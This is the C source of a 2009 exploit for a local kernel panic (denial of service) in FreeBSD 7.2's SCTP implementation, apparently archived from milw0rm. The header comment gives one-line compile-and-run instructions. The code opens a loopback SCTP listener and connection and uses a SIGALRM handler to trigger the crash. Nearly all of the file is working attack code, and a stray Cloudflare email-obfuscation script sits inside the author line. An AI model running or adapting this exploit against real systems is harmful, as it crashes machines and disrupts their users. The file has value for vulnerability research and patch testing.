/* fbsd-sctp-panic.c
 *
 * freebsd 7.2-RELEASE SCTP local kernel DoS (kern panic)
 * only tested on 7.2-RELEASE, probably older and newer builds are vuln.  as well
 * based on an unfixed bug found here: <http://www.freebsd.org/cgi/query-pr.cgi?pr=136803>
 *
 * by Shaun Colley <shaun@rsc.cx<SCRIPT type=text/javascript>
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</SCRIPT>>, Wed 05 Aug 2009
 *
 * $ gcc fbsd-sctp-panic.c -o fbsd-sctp-panic && ./fbsd-sctp-panic
 * wait a few seconds..
 *
 * - shaun
 */

#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/time.h>
#include <fcntl.h>

int csock, sock, lsock;

void *accept_connection() {
	struct sockaddr_in sin;
	socklen_t size = sizeof(sin);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(0x7f000001);
	sin.sin_port = htons(1337);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	bind(sock, (struct sockaddr *)&sin, sizeof(sin));
	listen(sock, 1);
	lsock = accept(sock, (struct sockaddr *)&sin, &size);
}

void recvdata() {
	int flag;
	struct sctp_sndrcvinfo recvinfo;
	char buf[10];
	sctp_recvmsg(csock, buf, sizeof(buf), NULL, 0, &recvinfo, &flag);
}

void make_connection() {
	struct sockaddr_in consin;
	struct sctp_sndrcvinfo sinfo;

	csock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	consin.sin_family = AF_INET;
	consin.sin_addr.s_addr = htonl(0x7f000001);
	consin.sin_port = htons(1337);

	connect(csock, (struct sockaddr *)&consin, sizeof(consin));
	signal(SIGALRM, recvdata);
	sinfo.sinfo_stream = 1337;
	sctp_send(lsock, "pwned", sizeof("pwned"), &sinfo, 0);
}


int main() {

	alarm(2);
	signal(SIGALRM, make_connection);
	accept_connection();

	return 0;
}

// milw0rm.com [2009-08-06]
